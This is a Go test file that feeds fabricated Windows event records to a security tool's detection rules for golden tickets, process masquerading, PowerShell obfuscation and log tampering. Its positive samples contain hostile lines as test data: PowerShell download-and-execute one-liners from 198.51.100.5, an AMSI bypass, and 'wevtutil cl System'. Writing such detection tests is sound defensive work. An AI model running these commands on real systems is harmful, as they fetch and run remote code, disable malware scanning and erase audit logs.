package main

// Fabricated Windows agent records run through the offline Windows parser model
// (winParse) and the pinned SDK CEL. They pin the triggers and de-duplication
// keys that keep four Windows rules from flooding. The EventProcessor playground
// separately runs the real parser and alert plugins.
import (
	"encoding/json"
	"reflect"
	"testing"

	"github.com/threatwinds/go-sdk/plugins"
	"github.com/tidwall/gjson"
)

func winVolumeRaw(t *testing.T, code int, provider, channel string, data map[string]any) string {
	t.Helper()
	b, err := json.Marshal(map[string]any{
		"timestamp": "2026-09-29T10:00:00Z", "provider_name": provider, "channel": channel,
		"computer": "dc01.example.test", "recordId": 4242, "eventCode": code, "data": data,
	})
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

func winVolumeSecurity(t *testing.T, code int, data map[string]any) string {
	return winVolumeRaw(t, code, "Microsoft-Windows-Security-Auditing", "Security", data)
}

func winVolumePrivileged(t *testing.T, user, sid string) string {
	return winVolumeSecurity(t, 4672, map[string]any{
		"SubjectUserName": user, "SubjectDomainName": "EXAMPLE", "SubjectUserSid": sid, "SubjectLogonId": 999,
		"PrivilegeList": "SeTcbPrivilege SeSecurityPrivilege SeBackupPrivilege",
	})
}

func winVolumeTGT(t *testing.T, user string, encryption, status int) string {
	return winVolumeSecurity(t, 4768, map[string]any{
		"TargetUserName": user, "TargetDomainName": "EXAMPLE.TEST", "ServiceName": "krbtgt/EXAMPLE.TEST",
		"TicketEncryptionType": encryption, "Status": status, "PreAuthType": "2",
		"IpAddress": "::ffff:192.0.2.45", "IpPort": "50123",
	})
}

func winVolumeProcess(t *testing.T, path, commandLine string) string {
	return winVolumeSecurity(t, 4688, map[string]any{
		"NewProcessName": path, "CommandLine": commandLine, "ParentProcessName": `C:\Windows\System32\services.exe`,
		"SubjectUserName": "DC01$", "SubjectDomainName": "EXAMPLE", "SubjectUserSid": "S-1-5-18",
	})
}

func winVolumeScript(t *testing.T, text string) string {
	return winVolumeRaw(t, 4104, "Microsoft-Windows-PowerShell", "Microsoft-Windows-PowerShell/Operational", map[string]any{
		"MessageNumber": "1", "MessageTotal": "1", "Path": "", "ScriptBlockId": "0b0c1d2e-0000-4000-8000-000000000001",
		"ScriptBlockText": text,
	})
}

func TestWindowsAlertVolume(t *testing.T) {
	cfg, rules, cache := winConfig(t), winRules(t), plugins.NewCELCache("windows-alert-volume")
	for _, tc := range []struct {
		file               string
		dedup              []string
		positive, negative []string
	}{
		{"golden_ticket_detection", []string{"dataSource", "adversary.user"},
			[]string{
				winVolumePrivileged(t, "svc-backup", "S-1-5-21-1111111111-2222222222-3333333333-1105"),
				winVolumeSecurity(t, 4769, map[string]any{"TargetUserName": "alice@EXAMPLE.TEST", "TargetDomainName": "EXAMPLE.TEST",
					"ServiceName": "krbtgt", "Status": 31, "TicketEncryptionType": 23, "IpAddress": "::ffff:192.0.2.44", "IpPort": "50124"}),
			},
			[]string{
				// SYSTEM, LOCAL SERVICE and NETWORK SERVICE under translated names, by SID.
				winVolumePrivileged(t, "SISTEMA", "S-1-5-18"),
				winVolumePrivileged(t, "Système", "S-1-5-18"),
				winVolumePrivileged(t, "SERVICIO LOCAL", "S-1-5-19"),
				winVolumePrivileged(t, "SERVICIO DE RED", "S-1-5-20"),
				winVolumePrivileged(t, "DC01$", "S-1-5-21-1111111111-2222222222-3333333333-1000"),
				// TGT requests: an unknown principal (0x6, no ticket issued) and an RC4 ticket issued.
				winVolumeTGT(t, "host", 0xFFFFFFFF, 0x6),
				winVolumeTGT(t, "legacy-app", 0x17, 0),
			}},
		{"masquerading_detection", []string{"dataSource", "lastEvent.log.data.NewProcessName"},
			[]string{
				winVolumeProcess(t, `C:\Users\Public\svchost.exe`, ""),
				winVolumeProcess(t, `C:\ProgramData\lsass.exe`, ""),
				winVolumeProcess(t, `C:\Temp\explorer.exe`, ""),
			},
			[]string{
				winVolumeProcess(t, `C:\WINDOWS\System32\svchost.exe`, ""),
				winVolumeProcess(t, `C:\WINDOWS\explorer.exe`, ""),
				winVolumeProcess(t, `C:\Windows\SysWOW64\explorer.exe`, ""),
				winVolumeProcess(t, `C:\Windows\System32\csrss.exe`, ""),
				winVolumeProcess(t, `C:\Program Files\WindowsApps\Microsoft.GamingServices_38.117.18001.0_x64__8wekyb3d8bbwe\gamingservices.exe`, ""),
			}},
		{"suspicious_powershell_obfuscation", []string{"dataSource"},
			[]string{
				winVolumeScript(t, "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.5/a.ps1')"),
				winVolumeScript(t, "$r = Invoke-WebRequest -Uri https://198.51.100.5/p -UseBasicParsing\nInvoke-Expression $r.Content"),
				winVolumeScript(t, "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"),
			},
			[]string{
				// A software installer script: iex only inside msiexec.
				winVolumeScript(t, "enum ExitCode {\n    ERR_MSIEXEC_NOT_FOUND = 49\n}\n$ProgressPreference = 'SilentlyContinue'\nInvoke-WebRequest @requestParams\nStart-Process msiexec.exe -ArgumentList '/i', $msi -Wait"),
				// A management script that downloads and decodes data.
				winVolumeScript(t, "function Invoke-WebRequestWithRootCaVerification { param($Uri) Invoke-WebRequest -Uri $Uri }\n$bytes = [Convert]::FromBase64String($certificate)"),
			}},
		{"audit_or_event_log_tampering", []string{"dataSource", "lastEvent.log.providerName"},
			[]string{
				winVolumeRaw(t, 104, "Microsoft-Windows-Eventlog", "System", map[string]any{
					"SubjectUserName": "admin", "SubjectDomainName": "EXAMPLE", "Channel": "System", "BackupPath": ""}),
				winVolumeProcess(t, `C:\Windows\System32\wevtutil.exe`, "wevtutil cl System"),
			},
			[]string{
				winVolumeRaw(t, 104, "Directory Synchronization", "Application", map[string]any{}),
				winVolumeRaw(t, 104, "WudfUsbccidDriver", "System", map[string]any{}),
				winVolumeProcess(t, `C:\Windows\System32\wevtutil.exe`, "wevtutil qe System /c:5"),
			}},
	} {
		t.Run(tc.file, func(t *testing.T) {
			r := rules[tc.file]
			if r == nil {
				t.Fatalf("missing rule %s", tc.file)
			}
			if len(r.GroupBy) != 0 || !reflect.DeepEqual(r.DeduplicateBy, tc.dedup) {
				t.Fatalf("grouping got groupBy %v deduplicateBy %v, want deduplicateBy %v", r.GroupBy, r.DeduplicateBy, tc.dedup)
			}
			for i, raw := range append(tc.positive, tc.negative...) {
				want := i < len(tc.positive)
				out := winParse(t, cfg, raw, "dc01", cache)
				got, err := cache.Eval(r.Where, out)
				if err != nil || got != want {
					t.Fatalf("record %d: where got %v (%v), want %v for %s", i, got, err, want, out)
				}
				// The filter marks the same candidates the history search counts.
				if tc.file == "golden_ticket_detection" {
					if marker := gjson.Get(out, "log.authenticationCandidate.goldenTicketDetection").String() == "match"; marker != want {
						t.Fatalf("record %d: goldenTicketDetection marker %v, predicate %v", i, marker, want)
					}
				}
				if !want {
					continue
				}
				// adversary: origin, so alert keys read the event's origin side and the last event.
				for _, key := range tc.dedup {
					path := map[string]string{"dataSource": "dataSource", "adversary.user": "origin.user",
						"lastEvent.log.data.NewProcessName": "log.data.NewProcessName", "lastEvent.log.providerName": "log.providerName"}[key]
					if v := gjson.Get(out, path); v.Type != gjson.String || v.String() == "" {
						t.Fatalf("record %d: de-duplication key %s (%s) does not resolve to text in %s", i, key, path, out)
					}
				}
			}
			if tc.file == "golden_ticket_detection" && (len(r.Correlation) != 1 || r.Correlation[0].Count != 3 || r.Correlation[0].Within != "30m") {
				t.Fatalf("golden ticket history changed: %+v", r.Correlation)
			}
		})
	}
}
